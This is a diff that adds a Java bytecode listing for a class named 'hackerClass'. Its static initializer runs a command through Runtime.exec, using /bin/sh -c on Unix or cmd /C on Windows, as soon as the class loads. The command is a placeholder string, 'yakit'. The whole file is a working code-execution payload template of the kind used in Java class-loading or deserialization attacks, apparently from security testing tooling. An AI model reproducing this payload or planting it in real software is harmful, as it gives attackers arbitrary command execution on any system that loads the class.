@@ -1,0 +1,74 @@
+// class version 52.0 (52)
+// access flags 0x21
+public class hackerClass {
+
+
+  // access flags 0x1
+  public <init>()V
+    ALOAD 0
+    INVOKESPECIAL java/lang/Object.<init> ()V
+    RETURN
+    MAXSTACK = 1
+    MAXLOCALS = 1
+
+  // access flags 0x8
+  static <clinit>()V
+    TRYCATCHBLOCK L0 L1 L2 java/io/IOException
+    LDC "yakit"
+    ASTORE 0
+    GETSTATIC java/io/File.separator : Ljava/lang/String;
+    LDC "/"
+    INVOKEVIRTUAL java/lang/String.equals (Ljava/lang/Object;)Z
+    IFEQ L3
+    ICONST_3
+    ANEWARRAY java/lang/String
+    DUP
+    ICONST_0
+    LDC "/bin/sh"
+    AASTORE
+    DUP
+    ICONST_1
+    LDC "-c"
+    AASTORE
+    DUP
+    ICONST_2
+    ALOAD 0
+    AASTORE
+    ASTORE 1
+    GOTO L0
+   L3
+   FRAME APPEND [java/lang/String]
+    ICONST_3
+    ANEWARRAY java/lang/String
+    DUP
+    ICONST_0
+    LDC "cmd"
+    AASTORE
+    DUP
+    ICONST_1
+    LDC "/C"
+    AASTORE
+    DUP
+    ICONST_2
+    ALOAD 0
+    AASTORE
+    ASTORE 1
+   L0
+   FRAME APPEND [[Ljava/lang/String;]
+    INVOKESTATIC java/lang/Runtime.getRuntime ()Ljava/lang/Runtime;
+    ALOAD 1
+    INVOKEVIRTUAL java/lang/Runtime.exec ([Ljava/lang/String;)Ljava/lang/Process;
+    POP
+   L1
+    GOTO L4
+   L2
+   FRAME SAME1 java/io/IOException
+    ASTORE 2
+    ALOAD 2
+    INVOKEVIRTUAL java/io/IOException.printStackTrace ()V
+   L4
+   FRAME CHOP 2
+    RETURN
+    MAXSTACK = 4
+    MAXLOCALS = 3
+}
